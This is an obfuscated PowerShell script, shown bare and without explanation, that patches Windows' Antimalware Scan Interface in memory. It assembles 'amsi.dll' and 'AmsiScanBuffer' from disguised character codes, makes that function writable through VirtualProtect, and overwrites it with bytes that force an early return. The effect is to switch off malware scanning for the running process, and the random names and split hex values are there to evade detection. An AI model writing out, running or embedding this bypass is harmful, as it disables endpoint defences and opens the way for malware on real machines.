$Bx2O4FraO67ttj3K0N = @"
using System;
using System.Runtime.InteropServices;
public class Bx2O4FraO67ttj3K0N {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr iTqj4tMJ, string zovQ);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr ntEm, UIntPtr kG_ucFatDg0Y9l5bV, uint H3MNeCw, out uint Sbu4q2fm);
}
"@

Add-Type $Bx2O4FraO67ttj3K0N

$EsjZmKM4 = [Bx2O4FraO67ttj3K0N]::LoadLibrary("$([ChAR](97+34-34)+[CHaR](109+70-70)+[ChAR]([byte]0x73)+[CHAr]([BytE]0x69)+[CHar]([BytE]0x2e)+[cHaR]([ByTe]0x64)+[chAR]([byTe]0x6c)+[CHAr]([BYTE]0x6c))")
$ON9DuESQ4_b_IrTJLCJ = [Bx2O4FraO67ttj3K0N]::GetProcAddress($EsjZmKM4, "$([cHar]([BYte]0x41)+[CHAr]([BYTE]0x6d)+[chaR]([byTe]0x73)+[CHAR]([BYTe]0x69)+[chAr](31+52)+[CHar](99)+[chAr]([ByTe]0x61)+[CHaR](110)+[chAR]([ByTe]0x42)+[ChAr](117)+[cHAr](102+77-77)+[CHAR](102)+[CHaR]([bytE]0x65)+[chAR]([Byte]0x72))")
$p = 0
[Bx2O4FraO67ttj3K0N]::VirtualProtect($ON9DuESQ4_b_IrTJLCJ, [uint32]5, 0x40, [ref]$p)
$d3C10fQaUQFHUL = "0xB8"
$YUvLMneeQGBEdGUd0z = "0x57"
$Osv14PmsRCW = "0x00"
$EjVkPnH4Kp = "0x07"
$ITn3QpMbX_7 = "0x80"
$n5J4sap = "0xC3"
$zv5CyoY5KV5TqXyVQm = [Byte[]] ($d3C10fQaUQFHUL,$YUvLMneeQGBEdGUd0z,$Osv14PmsRCW,$EjVkPnH4Kp,+$ITn3QpMbX_7,+$n5J4sap)
[System.Runtime.InteropServices.Marshal]::Copy($zv5CyoY5KV5TqXyVQm, 0, $ON9DuESQ4_b_IrTJLCJ, 6)